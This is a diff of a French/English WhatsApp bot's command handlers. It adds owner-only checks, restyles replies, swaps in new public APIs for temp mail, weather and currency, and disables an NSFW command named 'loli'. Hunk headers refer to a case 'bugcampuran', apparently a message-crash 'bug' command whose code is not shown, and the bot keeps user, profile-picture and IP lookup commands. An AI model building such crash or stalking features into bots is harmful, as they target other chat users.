+        if (!num) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}${cmd} <number>*`); break; }
         updateState(s => {
           s.sudo = cmd === 'addsudo' ? [...new Set([...s.sudo, num])] : s.sudo.filter(n => n !== num);
         });
@@ -1515,50 +1194,48 @@ case 'bugcampuran': {
         break;
       }
       case 'listsudo': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         const s = getState();
-        await reply(`👑 *Sudo list (${s.sudo.length})*\n\n${s.sudo.map(n => `• +${n}`).join('\n') || '(empty)'}`);
+        await reply(`👑 *𝗦𝘂𝗱𝗼 𝗹𝗶𝘀𝘁 (${s.sudo.length})*\n\n${s.sudo.map(n => `• +${n}`).join('\n') || '(empty)'}`);
         break;
       }
-      case 'fixowner': { await reply(`👑 Owner: *${DEV_NAME}*\n📞 Bot: +${(natsu.user?.id || '').split(':')[0]}`); break; }
-      case 'getbot': { await reply(`🤖 *${BOT_NAME}* online\nID: ${natsu.user?.id}\nDev: ${DEV_NAME}`); break; }
+      case 'fixowner': { if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; } await reply(`👑 𝗢𝘄𝗻𝗲𝗿: *${DEV_NAME}*\n📞 𝗕𝗼𝘁: +${(natsu.user?.id || '').split(':')[0]}`); break; }
+      case 'getbot': { await reply(`🤖 *${BOT_NAME}* 𝗼𝗻𝗹𝗶𝗻𝗲\nID: ${natsu.user?.id}\n𝗗𝗲𝘃: ${DEV_NAME}`); break; }
       case 'broadcast': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}broadcast <msg>*`); break; }
-        await reply('📢 Broadcasting...');
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 <msg>*`); break; }
+        await reply('📢 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁𝗶𝗻𝗴...');
         try {
           const chats = await natsu.groupFetchAllParticipating();
           let ok = 0;
           for (const id of Object.keys(chats)) {
             try {
               await natsu.sendMessage(id, {
-                text: `📢 *BROADCAST*\n\n${arg}\n\n> ${BOT_NAME}`,
+                text: `📢 *𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧*\n\n${arg}\n\n> ${BOT_NAME}`,
                 contextInfo: forwardedContext(),
               });
               ok++;
               await new Promise(r => setTimeout(r, 1200));
             } catch {}
           }
-          await reply(`✅ Sent to ${ok} groups.`);
+          await reply(`✅ 𝗦𝗲𝗻𝘁 𝘁𝗼 ${ok} 𝗴𝗿𝗼𝘂𝗽𝘀.`);
         } catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
+      case 'prefix': {
+        await reply(`🔱 *Prefix principal:* ${getState().prefix || PREFIX}\n📌 *Préfixes acceptés:* ${[getState().prefix || PREFIX, ...PREFIXES.filter(p => p !== (getState().prefix || PREFIX))].join(' ')}`);
+        break;
+      }
       case 'mode': {
-        const current = String(getState().mode || 'public').toLowerCase();
-        const label = (current === 'private' || current === 'self')
-          ? 'PRIVATE 🔒'
-          : 'PUBLIC 🌍';
-        await reply(
-`╭━━━〔 ⚙️ 𝐁𝐎𝐓 𝐌𝐎𝐃𝐄 〕━━━╮
-┃
-┃ 🤖 Bot: *${BOT_NAME}*
-┃ 📡 Mode: *${label}*
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯`
-        );
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; } const s = getState(); await reply(`⚙️ 𝗠𝗼𝗱𝗲: *${s.mode}*`); break; }
+      case 'test': {
+        const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+        await reply(`✅ *KILLUA MD TEST OK*\n\n🟢 Commandes: actives\n⚙️ Mode: ${getState().mode}\n💾 RAM: ${mem} MB\n📡 Chat: ${isGroup(jid) ? 'Groupe' : 'Privé'}`);
         break;
       }
       case 'ping': {
         const start = Date.now();
-        await reply(`🏓 *Pong!* ⚡ ${Date.now() - start}ms`);
+        await reply(`🏓 *𝗣𝗼𝗻𝗴!* ⚡ ${Date.now() - start}ms`);
         break;
       }
       case 'alive': case 'runtime': case 'uptime': {
@@ -1566,10 +1243,19 @@ case 'bugcampuran': {
         const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60), s = Math.floor(up % 60);
         const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
         await img(MENU_IMAGE,
-`🟢 *${BOT_NAME} is alive!*
-⏱️ Uptime: ${h}h ${m}m ${s}s
-💾 Memory: ${mem} MB
-👑 Dev: ${DEV_NAME}`);
+`╭━━━〔 ${BOT_NAME} 〕━━━╮
+
+🟢 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗻𝗹𝗶𝗻𝗲 & 𝗔𝗰𝘁𝗶𝘃𝗲
+> ⏱️ 𝗨𝗽𝘁𝗶𝗺𝗲:
+➜ ${h}𝗵 ${m}𝗺 ${s}𝘀
+> 💾 𝗠𝗲𝗺𝗼𝗿𝘂:
+➜ ${mem} 𝗠𝗕
+> 👑 𝗗𝗘𝗩 𝗕𝗬 :
+➜ ${DEV_NAME}
+━━━━━━━━━━━━━━━━━━
+> 𝗧𝗵𝗲 𝗚𝗼𝗮𝘁 𝗢𝗳 𝗕𝗼𝘁𝘀
+
+╰━━━〔 𝗣𝗨𝗟𝗚𝗔 〕━━━╯`);
         break;
       }
 
@@ -1585,10 +1271,12 @@ case 'bugcampuran': {
         await reply(`🔥 *DARE*\n\n${RAND(arr)}`); break;
       }
       case 'joke': {
-        try { const r = await axios.get('https://official-joke-api.appspot.com/random_joke', { timeout: 6000 });
-          await reply(`😂 *Joke*\n\n${r.data.setup}\n— ${r.data.punchline}`); }
-        catch { await reply(`😂 ${RAND(['Why did the dev quit? No arrays.','I told a UDP joke, you might not get it.'])}`); }
-        break;
+        const jokes = [
+          ['Pourquoi le développeur aime les pauses ?', 'Parce que son code avait besoin de respirer.'],
+          ['Pourquoi le serveur est calme ?', 'Parce qu’il garde toujours son cache.'],
+          ['Pourquoi JavaScript ne dort jamais ?', 'Parce qu’il attend toujours une promesse.']
+        ];
+        const j = RAND(jokes); await reply(`😂 *Joke*\n\n${j[0]}\n— ${j[1]}`); break;
       }
       case 'meme': {
         try { const r = await axios.get('https://meme-api.com/gimme', { timeout: 5000 });
@@ -1632,10 +1320,12 @@ case 'bugcampuran': {
         break;
       }
       case 'moviequote': {
-        try { const r = await axios.get('https://api.quotable.io/random?tags=famous-quotes', { timeout: 5000 });
-          await reply(`🎬 *MOVIE QUOTE*\n\n"${r.data.content}"\n— ${r.data.author}`); }
-        catch { await reply('🎬 "May the Force be with you." — Star Wars'); }
-        break;
+        const q = RAND([
+          ['Le Seigneur des anneaux','Même les plus petites personnes peuvent changer le cours de l’avenir.'],
+          ['Star Wars','Que la Force soit avec toi.'],
+          ['Harry Potter','Ce sont nos choix qui montrent ce que nous sommes vraiment.']
+        ]);
+        await reply(`🎬 *MOVIE QUOTE*\n\n“${q[1]}”\n— ${q[0]}`); break;
       }
       case 'triviafact': case 'funfact': case 'fact': {
         try { const r = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random?language=en', { timeout: 5000 });
@@ -1644,23 +1334,25 @@ case 'bugcampuran': {
         break;
       }
       case 'inspire': {
-        try { const r = await axios.get('https://api.quotable.io/random?tags=inspirational', { timeout: 5000 });
-          await reply(`✨ *INSPIRE*\n\n"${r.data.content}"\n— ${r.data.author}`); }
-        catch { await reply('✨ "The best way out is always through." — Robert Frost'); }
-        break;
+        const q = RAND([
+          ['Chaque petite étape compte.','KILLUA MD'],
+          ['La constance transforme les idées en résultats.','KILLUA MD'],
+          ['Commence petit, améliore chaque jour.','KILLUA MD']
+        ]);
+        await reply(`✨ *INSPIRE*\n\n“${q[0]}”\n— ${q[1]}`); break;
       }
       case 'ascii': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}ascii <text>*`); break; }
-        try { const r = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(arg)}`, { timeout: 5000 });
-          await reply('```' + r.data + '```'); }
-        catch { await reply('❌ Service down.'); }
-        break;
+        const clean = arg.replace(/[^\x20-\x7E]/g, '').slice(0, 120);
+        await reply('```\n' + clean + '\n```'); break;
       }
       case 'progquote': {
-        try { const r = await axios.get('https://programming-quotesapi.vercel.app/api/random', { timeout: 5000 });
-          const q = r.data; await reply(`💻 *PROG QUOTE*\n\n"${q.quote || q.en}"\n— ${q.author}`); }
-        catch { await reply('💻 "Talk is cheap. Show me the code." — Linus Torvalds'); }
-        break;
+        const q = RAND([
+          ['Le code doit être simple à lire et facile à corriger.','KILLUA MD'],
+          ['Un bon programme explique ses intentions.','KILLUA MD'],
+          ['Teste tôt, corrige vite.','KILLUA MD']
+        ]);
+        await reply(`💻 *PROG QUOTE*\n\n“${q[0]}”\n— ${q[1]}`); break;
       }
       case 'dadjoke': {
         try { const r = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' }, timeout: 5000 });
@@ -1771,50 +1463,96 @@ case 'bugcampuran': {
       // ═════════════════════════════════════════════════════════════════════
       // TEMP MAIL MENU
       // ═════════════════════════════════════════════════════════════════════
-      case 'newmail': case 'tempmail2': {
+      case 'newmail': case 'tempmail': case 'tempmail2': {
         try {
-          const r = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1', { timeout: 6000 });
-          updateState(s => { s.tempmail = r.data[0]; });
-          await reply(`📧 *Temp mail*\n\n\`${r.data[0]}\`\nRead with: *${PREFIX}readmail*`);
-        } catch (e) { await reply(`❌ ${e.message}`); }
+          const login = `killua${Math.random().toString(36).slice(2,10)}`;
+          const password = `${Math.random().toString(36).slice(2)}K9!`;
+          const domains = await axios.get('https://api.mail.tm/domains?page=1', { timeout: 10000 });
+          const domain = domains.data?.['hydra:member']?.find(d => d.isActive)?.domain;
+          if (!domain) throw new Error('aucun domaine disponible');
+          const email = `${login}@${domain}`;
+          const acc = await axios.post('https://api.mail.tm/accounts', { address: email, password }, { timeout: 10000 });
+          const token = (await axios.post('https://api.mail.tm/token', { address: email, password }, { timeout: 10000 })).data?.token;
+          if (!token) throw new Error('token indisponible');
+          updateState(s => { s.tempmailByChat ??= {}; s.tempmailByChat[jid] = { email, provider: 'mail.tm', token, accountId: acc.data?.id, password }; s.tempmail = email; });
+          await reply(`╭━━〔 📧 *TEMPMAIL* 〕━━╮\n│ ✉️ ${email}\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n◈ ${PREFIX}readmail\n◈ ${PREFIX}deltmp`);
+        } catch (e) { await reply(`❌ TempMail indisponible.\n_${e.message}_`); }
         break;
       }
-      case 'readmail': case 'tempmail-inbox': {
-        const s = getState(); if (!s.tempmail) { await reply(`❌ Generate one: *${PREFIX}newmail*`); break; }
-        const [login, domain] = s.tempmail.split('@');
+      case 'readmail': case 'inbox': case 'tempmail-inbox': {
+        const account = getState().tempmailByChat?.[jid];
+        const email = account?.email || getState().tempmail;
+        if (!email) { await reply(`❌ Génère d'abord une adresse avec *${PREFIX}newmail*.`); break; }
         try {
-          const r = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`, { timeout: 6000 });
-          if (!r.data.length) { await reply(`📭 Inbox empty for \`${s.tempmail}\``); break; }
-          let out = `📬 *Inbox — ${s.tempmail}*\n\n`;
-          for (const m of r.data.slice(0, 5)) {
-            const det = await axios.get(`https://www.1secmail.com/api/v1/?action=readMessage&login=${login}&domain=${domain}&id=${m.id}`, { timeout: 6000 });
-            out += `📨 *${det.data.subject}*\nFrom: ${det.data.from}\n${(det.data.textBody||det.data.body||'').slice(0,300)}\n\n`;
+          if (account?.provider === 'mail.tm' && account.token) {
+            const r = await axios.get('https://api.mail.tm/messages', { headers: { Authorization: `Bearer ${account.token}` }, timeout: 10000 });
+            const messages = r.data?.['hydra:member'] || [];
+            if (!messages.length) { await reply(`📭 Inbox vide pour *${email}*`); break; }
+            let out = `📬 *INBOX — ${email}*\n\n`;
+            for (const m of messages.slice(0,5)) out += `📨 *${m.subject || '(sans sujet)'}*\n👤 ${m.from?.address || 'unknown'}\n🆔 ${m.id}\n\n`;
+            await reply(out);
+          } else {
+            await reply(`❌ Cette adresse n'utilise plus un fournisseur compatible. Crée une nouvelle adresse avec *${PREFIX}newmail*.`);
           }
-          await reply(out);
-        } catch (e) { await reply(`❌ ${e.message}`); }
+        } catch (e) { await reply(`❌ Impossible de lire l'inbox : ${e.message}`); }
         break;
       }
-      case 'deltmp': { updateState(s => { delete s.tempmail; }); await reply('🗑️ Temp mail deleted.'); break; }
+      case 'deltmp': case 'delmail': {
+        const account = getState().tempmailByChat?.[jid];
+        try { if (account?.provider === 'mail.tm' && account.accountId && account.token) await axios.delete(`https://api.mail.tm/accounts/${account.accountId}`, { headers: { Authorization: `Bearer ${account.token}` }, timeout: 10000 }); } catch {}
+        updateState(s => { if (s.tempmailByChat) delete s.tempmailByChat[jid]; if (s.tempmail && !s.tempmailByChat?.[jid]) delete s.tempmail; });
+        await reply('🗑️ *TempMail supprimé pour cette conversation.*');
+        break;
+      }
 
       // ═════════════════════════════════════════════════════════════════════
       // OTHER MENU
       // ═════════════════════════════════════════════════════════════════════
+      case 'mediastatus': {
+        const checks = [];
+        try { await execFileAsync('ffmpeg', ['-version'], { timeout: 5000 }); checks.push('🟢 ffmpeg'); } catch { checks.push('🔴 ffmpeg'); }
+        try { await execFileAsync('yt-dlp', ['--version'], { timeout: 5000 }); checks.push('🟢 yt-dlp'); } catch { checks.push('🟡 yt-dlp absent — les APIs de secours seront utilisées'); }
+        await reply(`🎬 *MEDIA STATUS*\n\n${checks.join('\n')}`); break;
+      }
+      case 'apistatus': {
+        const checks = [
+          ['Mail.tm', 'https://api.mail.tm/domains'],
+          ['Open-Meteo', 'https://geocoding-api.open-meteo.com/v1/search?name=Kinshasa&count=1'],
+          ['Frankfurter', 'https://api.frankfurter.dev/v2/rate/USD/EUR'],
+          ['LRCLIB', 'https://lrclib.net/api/search?q=hello'],
+          ['Jikan', 'https://api.jikan.moe/v4/anime?q=naruto&limit=1'],
+          ['Waifu.pics', 'https://api.waifu.pics/sfw/waifu'],
+        ];
+        const out = [];
+        for (const [name, url] of checks) {
+          const t = Date.now();
+          try { const r = await axios.get(url, { timeout: 5000 }); out.push(`🟢 ${name} — ${r.status} (${Date.now()-t}ms)`); }
+          catch { out.push(`🔴 ${name} — OFFLINE/ERROR`); }
+        }
+        await reply(`🩺 *API STATUS*\n\n${out.join('\n')}`);
+        break;
+      }
       case 'weatherwiki': case 'weather': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}weather <city>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}weather <city>*`); break; }
         try {
-          const r = await axios.get(`https://wttr.in/${encodeURIComponent(arg)}?format=j1`, { timeout: 5000 });
-          const c = r.data.current_condition[0], a = r.data.nearest_area[0];
-          await reply(`🌍 *${a.areaName[0].value}, ${a.country[0].value}*\n☀️ ${c.temp_C}°C — ${c.weatherDesc[0].value}\n💧 ${c.humidity}% • 💨 ${c.windspeedKmph} km/h`);
-        } catch { await reply('❌ Weather error.'); }
+          const geo = await axios.get('https://geocoding-api.open-meteo.com/v1/search', { params: { name: arg, count: 1, language: 'fr', format: 'json' }, timeout: 7000 });
+          const g = geo.data?.results?.[0];
+          if (!g) throw new Error('ville introuvable');
+          const r = await axios.get('https://api.open-meteo.com/v1/forecast', { params: { latitude: g.latitude, longitude: g.longitude, current: 'temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m', timezone: 'auto' }, timeout: 7000 });
+          const c = r.data?.current;
+          if (!c) throw new Error('météo indisponible');
+          const labels = {0:'☀️ Ciel dégagé',1:'🌤️ Principalement dégagé',2:'⛅ Partiellement nuageux',3:'☁️ Couvert',45:'🌫️ Brouillard',48:'🌫️ Brouillard givrant',51:'🌦️ Bruine légère',53:'🌦️ Bruine',55:'🌧️ Bruine forte',61:'🌦️ Pluie légère',63:'🌧️ Pluie',65:'🌧️ Forte pluie',71:'🌨️ Neige légère',73:'🌨️ Neige',75:'❄️ Forte neige',80:'🌦️ Averses',81:'🌧️ Averses',82:'⛈️ Fortes averses',95:'⛈️ Orage',96:'⛈️ Orage + grêle',99:'⛈️ Orage + forte grêle'};
+          await reply(`🌍 *${g.name}, ${g.country}*\n${labels[c.weather_code] || '🌡️ Conditions actuelles'}\n🌡️ ${c.temperature_2m}°C (ressenti ${c.apparent_temperature}°C)\n💧 ${c.relative_humidity_2m}% • 💨 ${c.wind_speed_10m} km/h`);
+        } catch (e) { await reply(`❌ 𝗪𝗲𝗮𝘁𝗵𝗲𝗿 : ${e.message}`); }
         break;
       }
       case 'currency': {
-        const p = arg.split(/\s+/); if (p.length < 3) { await reply(`❌ Usage: *${PREFIX}currency 100 USD EUR*`); break; }
+        const p = arg.split(/\s+/); if (p.length < 3) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗰𝘂𝗿𝗿𝗲𝗻𝗰𝘆 100 𝗨𝗦𝗗 𝗘𝗨𝗥*`); break; }
         const [amt, from, to] = p;
-        try { const r = await axios.get(`https://api.exchangerate-api.com/v4/latest/${from.toUpperCase()}`, { timeout: 5000 });
-          const v = (parseFloat(amt) * r.data.rates[to.toUpperCase()]).toFixed(2);
-          await reply(`💱 ${amt} ${from.toUpperCase()} = *${v} ${to.toUpperCase()}*`); }
-        catch { await reply('❌ Rate unavailable.'); }
+        try { const r = await axios.get(`https://api.frankfurter.dev/v2/rate/${from.toUpperCase()}/${to.toUpperCase()}`, { timeout: 7000 });
+          const v = (parseFloat(amt) * Number(r.data.rate)).toFixed(2);
+          await reply(`💱 ${amt} ${from.toUpperCase()} = *${v} ${to.toUpperCase()}*\n📅 ${r.data.date}`); }
+        catch (e) { await reply(`❌ 𝗥𝗮𝘁𝗲 𝘂𝗻𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 : ${e.message}`); }
         break;
       }
       case 'time': {
@@ -1823,13 +1561,13 @@ case 'bugcampuran': {
         break;
       }
       case 'qrcode': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}qrcode <text>*`); break; }
-        await img(`https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(arg)}`, `📱 QR for: ${arg}`);
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗾𝗿𝗰𝗼𝗱𝗲 <text>*`); break; }
+        await img(`https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(arg)}`, `📱 𝗤𝗥 𝗳𝗼𝗿: ${arg}`);
         break;
       }
-      case 'readqr': { await reply('🔍 Reply to a QR image (feature requires sharp/jimp — coming soon).'); break; }
+      case 'readqr': { await reply('🔍 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗤𝗥 𝗶𝗺𝗮𝗴𝗲 (feature requires sharp/jimp — coming soon).'); break; }
       case 'shorturl': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}shorturl <url>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝘀𝗵𝗼𝗿𝘁𝘂𝗿𝗹 <url>*`); break; }
         try { const r = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(arg)}`, { timeout: 5000 });
           await reply(`🔗 ${r.data}`); }
         catch { await reply('❌ Error.'); }
@@ -1837,41 +1575,41 @@ case 'bugcampuran': {
       }
       case 'myip': {
         try { const r = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
-          await reply(`🌐 Bot IP: *${r.data.ip}*`); }
-        catch { await reply('❌ Error.'); }
+          await reply(`🌐 𝗕𝗼𝘁 𝗜𝗣: *${r.data.ip}*`); }
+        catch { await reply('❌ 𝗘𝗿𝗿𝗼𝗿.'); }
         break;
       }
       case 'iplookup': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}iplookup <ip>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗶𝗽𝗹𝗼𝗼𝗸𝘂𝗽 <ip>*`); break; }
         try { const r = await axios.get(`https://ipapi.co/${arg}/json/`, { timeout: 5000 });
           const d = r.data; await reply(`🌐 *${d.ip}*\n📍 ${d.city}, ${d.region}, ${d.country_name}\n🏢 ${d.org}\n🕐 ${d.timezone}`); }
-        catch { await reply('❌ Lookup failed.'); }
+        catch { await reply('❌ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗳𝗮𝗶𝗹𝗲𝗱.'); }
         break;
       }
-      case 'jid': { await reply(`🆔 *Chat JID:* ${jid}\n👤 *Sender:* ${senderJid}`); break; }
+      case 'jid': { await reply(`🆔 *𝗖𝗵𝗮𝘁 𝗝𝗜𝗗:* ${jid}\n👤 *𝗦𝗲𝗻𝗱𝗲𝗿:* ${senderJid}`); break; }
       case 'getpp': {
         const tgt = arg.replace(/\D/g, '') ? `${arg.replace(/\D/g,'')}@s.whatsapp.net` : senderJid;
         try { const url = await natsu.profilePictureUrl(tgt, 'image'); await img(url, `📸 PP of +${tgt.split('@')[0]}`); }
-        catch { await reply('❌ No profile picture available.'); }
+        catch { await reply('❌ 𝗡𝗼 𝗽𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.'); }
         break;
       }
       case 'github': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}github <user>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗴𝗶𝘁𝗵𝘂𝗯 <user>*`); break; }
         try { const r = await axios.get(`https://api.github.com/users/${arg}`, { timeout: 5000 });
           const u = r.data;
-          await img(u.avatar_url, `🐙 *${u.login}*\n${u.name || ''}\n${u.bio || ''}\n👥 Followers: ${u.followers}\n📦 Repos: ${u.public_repos}\n🔗 ${u.html_url}`); }
-        catch { await reply('❌ User not found.'); }
+          await img(u.avatar_url, `🐙 *${u.login}*\n${u.name || ''}\n${u.bio || ''}\n👥 Followers: ${u.followers}\n📦 𝗥𝗲𝗽𝗼𝘀: ${u.public_repos}\n🔗 ${u.html_url}`); }
+        catch { await reply('❌ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.'); }
         break;
       }
       case 'npm': case 'npmstalk': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}npm <package>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗻𝗽𝗺 <package>*`); break; }
         try { const r = await axios.get(`https://registry.npmjs.org/${arg}`, { timeout: 5000 });
-          const d = r.data; await reply(`📦 *${d.name}*\n${d.description || ''}\nLatest: ${d['dist-tags']?.latest}\nLicense: ${d.license || 'N/A'}\nHome: ${d.homepage || ''}`); }
-        catch { await reply('❌ Package not found.'); }
+          const d = r.data; await reply(`📦 *${d.name}*\n${d.description || ''}\nLatest: ${d['dist-tags']?.latest}\nLi+cense: ${d.license || 'N/A'}\nHome: ${d.homepage || ''}`); }
+        catch { await reply('❌ 𝗣𝗮𝗰𝗸𝗮𝗴𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.'); }
         break;
       }
       case 'ffstalk': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}ffstalk <FreeFireID>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝗳𝗳𝘀𝘁𝗮𝗹𝗸 <FreeFireID>*`); break; }
         const d = await tryFetch([`https://api.giftedtech.web.id/api/stalk/ffstalk?apikey=gifted&id=${arg}`]);
         if (!d) { await reply('❌ Stalk failed.'); break; }
         await reply(`🎮 *Free Fire*\n${JSON.stringify(d.result || d, null, 2).slice(0, 1500)}`);
@@ -1939,8 +1677,7 @@ case 'bugcampuran': {
       }
       case 'horoscope': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}horoscope <sign>*`); break; }
-        const d = await tryFetch([`https://aztro.sameerkumar.website/?sign=${arg.toLowerCase()}&day=today`,
-          `https://horoscope-app-api.vercel.app/api/v1/get-horoscope/daily?sign=${arg.toLowerCase()}&day=TODAY`]);
+        const d = await tryFetch([`https://horoscope-app-api.vercel.app/api/v1/get-horoscope/daily?sign=${arg.toLowerCase()}&day=TODAY`]);
         if (!d) { await reply('❌ Error.'); break; }
         await reply(`🔮 *${arg.toUpperCase()} — TODAY*\n\n${d.description || d.data?.horoscope_data || JSON.stringify(d).slice(0,500)}`);
         break;
@@ -1961,26 +1698,41 @@ case 'bugcampuran': {
       case 'sfw': case 'moe': case 'aipic': {
         const url = await fetchAnyImage([
           'https://api.waifu.pics/sfw/waifu',
-          'https://nekos.best/api/v2/neko',
+          'https://api.waifu.pics/sfw/neko',
+          'https://nekos.best/api/v2/neko'
         ]);
-        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Error.');
+        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Image indisponible, réessaie.');
         break;
       }
       case 'hentai': case 'loli': {
-        const url = await fetchAnyImage([`https://api.waifu.pics/nsfw/${cmd==='loli'?'waifu':'waifu'}`,'https://nekos.life/api/v2/img/Random_hentai_gif']);
-        if (url) await img(url, `🔞 *${cmd.toUpperCase()}*`); else await reply('❌ Error.');
+        await reply('❌ Cette commande est désactivée.');
         break;
       }
+
       case 'chinagirl': case 'bluearchive': case 'boypic': case 'carimage':
       case 'random-girl': case 'hijab-girl': case 'indonesia-girl':
       case 'japan-girl': case 'korean-girl': case 'malaysia-girl':
       case 'profile-pictures': case 'tiktokgirl': {
+        const prompts = {
+          chinagirl:'portrait of an adult Chinese woman, elegant, safe for work',
+          bluearchive:'anime character, blue themed, safe for work',
+          boypic:'anime boy portrait, profile picture, safe for work',
+          carimage:'cinematic sports car, high quality photography',
+          'random-girl':'portrait of an adult woman, aesthetic profile picture, safe for work',
+          'hijab-girl':'portrait of an adult woman wearing a hijab, elegant, safe for work',
+          'indonesia-girl':'portrait of an adult Indonesian woman, elegant, safe for work',
+          'japan-girl':'portrait of an adult Japanese woman, elegant, safe for work',
+          'korean-girl':'portrait of an adult Korean woman, elegant, safe for work',
+          'malaysia-girl':'portrait of an adult Malaysian woman, elegant, safe for work',
+          'profile-pictures':'cool aesthetic profile picture, digital art',
+          tiktokgirl:'portrait of an adult woman, modern social profile picture, safe for work'
+        };
         const url = await fetchAnyImage([
-          `https://api.giftedtech.web.id/api/sfw/${cmd.replace('-','')}?apikey=gifted`,
-          `https://api.giftedtech.web.id/api/anime/${cmd.replace('-','')}?apikey=gifted`,
           'https://api.waifu.pics/sfw/waifu',
+          'https://api.waifu.pics/sfw/neko',
+          'https://nekos.best/api/v2/neko'
         ]);
-        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Try again later.');
+        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Image indisponible, réessaie.');
         break;
       }
 
@@ -2001,9 +1753,13 @@ case 'bugcampuran': {
         await img(c.images?.jpg?.image_url, `🎌 *${c.name}*\n${c.about?.slice(0,800) || ''}`); break;
       }
       case 'aquote': {
-        const d = await tryFetch(['https://animechan.io/api/v1/quotes/random']);
-        const q = d?.data; if (!q) { await reply(`💬 "I'll become the Pirate King!" — Luffy`); break; }
-        await reply(`💬 *${q.character?.name}* (${q.anime?.name})\n\n"${q.content}"`); break;
+        const q = RAND([
+          ['Naruto Uzumaki','La persévérance compte plus que le talent quand on continue d’avancer.'],
+          ['Edward Elric','Même une petite avancée reste une avancée.'],
+          ['Monkey D. Luffy','Je n’abandonne pas ce que j’ai décidé de faire.'],
+          ['Tanjiro Kamado','La gentillesse et la détermination peuvent aller ensemble.']
+        ]);
+        await reply(`💬 *${q[0]}*\n\n“${q[1]}”`); break;
       }
       case 'arecommend': {
         const d = await tryFetch(['https://api.jikan.moe/v4/recommendations/anime']);
@@ -2018,8 +1774,12 @@ case 'bugcampuran': {
         break;
       }
       case 'maid': case 'megumin': case 'neko': case 'shinobu': case 'waifu': {
-        const url = await fetchAnyImage([`https://api.waifu.pics/sfw/${cmd}`, `https://nekos.best/api/v2/${cmd}`]);
-        if (url) await img(url, `🌸 *${cmd.toUpperCase()}*`); else await reply('❌ Try again.');
+        const url = await fetchAnyImage([
+          `https://api.waifu.pics/sfw/${cmd}`,
+          `https://nekos.best/api/v2/${cmd}`,
+          `https://image.pollinations.ai/prompt/${encodeURIComponent(`safe for work ${cmd} anime character`)}?width=768&height=768&nologo=true`
+        ]);
+        if (url) await img(url, `🌸 *${cmd.toUpperCase()}*`); else await reply('❌ Anime indisponible, réessaie.');
         break;
       }
 
@@ -2032,36 +1792,139 @@ case 'bugcampuran': {
       // ═════════════════════════════════════════════════════════════════════
       // DOWNLOADER
       // ═════════════════════════════════════════════════════════════════════
+      // Resolve a search query to a YouTube URL, then convert it to MP3.
+      // Several public search mirrors are tried because free endpoints can
+      // temporarily disappear. Direct YouTube URLs skip the search step.
+      async function resolveYouTubeUrl(query) {
+        if (/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//i.test(query)) return query;
+        const instances = [
